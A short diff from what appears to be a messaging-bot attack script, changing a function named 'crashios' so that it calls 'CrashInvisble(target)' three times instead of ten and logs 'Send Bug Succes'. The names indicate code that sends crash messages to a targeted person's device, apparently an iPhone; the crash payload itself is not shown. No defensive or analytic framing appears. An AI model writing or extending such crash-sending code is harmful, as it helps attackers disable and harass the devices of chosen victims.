@@ -3571,7 +3571,7 @@ async function pedox(sock, target) {
   }
 }
 async function crashios(sock, target) {
-  for (let i = 0; i < 10; i++) {
+  for (let i = 0; i < 3; i++) {
       await CrashInvisble(target);
       console.log(chalk.red("Send Bug Succes"))
   }
